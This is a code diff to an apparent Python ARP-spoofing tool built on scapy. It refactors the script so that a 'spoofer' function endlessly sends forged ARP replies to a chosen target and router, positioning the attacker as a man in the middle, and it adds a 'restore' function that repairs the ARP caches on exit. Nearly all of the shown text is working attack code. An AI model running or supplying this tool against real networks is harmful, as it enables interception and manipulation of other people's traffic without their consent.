@@ -50,7 +50,7 @@ def get_target_mac(ip):
     return answered_list[0][1].hwsrc
 
 
-def spoof(dest_IP, spoofed_IP):
+def spoof_packet_maker(dest_IP, spoofed_IP):
     target_mac = get_target_mac(dest_IP)
     packet = scapy.ARP(op=2, pdst=dest_IP, hwdst=target_mac, psrc=spoofed_IP)
 
@@ -67,28 +67,42 @@ def spoof(dest_IP, spoofed_IP):
 #    subprocess.run("echo '0' > sudo tee /proc/sys/net/ipv4/conf/" + i + "/forwarding")
 
 
+def spoofer(p_f_t, p_f_r, target_IP, router_IP):
+
+    print("[+] Spoofing has begin")
+    packet_count = 0
+    try:
+        while True:
+            scapy.send(p_f_t, verbose=False)
+            scapy.send(p_f_r, verbose=False)
+            packet_count = packet_count + 2
+            print("\r[+] sent " + str(packet_count) + " packets", end="")
+            time.sleep(3)
+    except KeyboardInterrupt:
+        print("\n[-] Ctrl + C detected ... Quitting")
+        restore(target_IP, router_IP)
+
+
+def restore(dest_IP, source_IP):
+    dest_mac = get_target_mac(dest_IP)
+    source_mac = get_target_mac(source_IP)
+
+    last_packet = scapy.ARP(op=2, pdst=dest_IP, hwdst=dest_mac, psrc=source_IP, hwsrc=source_mac)
+    scapy.send(last_packet)
+
+
 def main():
     options = get_arguments()
     target_IP = options.target
     router_IP = options.router
 #    interface = options.interface
 
-    packet_for_target = spoof(target_IP, router_IP)
-    packet_for_router = spoof(router_IP, target_IP)
+    packet_for_target = spoof_packet_maker(target_IP, router_IP)
+    packet_for_router = spoof_packet_maker(router_IP, target_IP)
 
 #    start_flow(interface)
 
-    print("[+] Spoofing has begin")
-    packet_count = 0
-    try:
-        while True:
-            scapy.send(packet_for_target, verbose=False)
-            scapy.send(packet_for_router, verbose=False)
-            packet_count = packet_count + 2
-            print("\r[+] sent " + str(packet_count) + " packets", end="")
-            time.sleep(3)
-    except KeyboardInterrupt:
-        print("[+] Ctrl + C detected ... Quitting")
+    spoofer(packet_for_target, packet_for_router, target_IP, router_IP)
 
 
 #    atexit.register(stop_flow(interface))
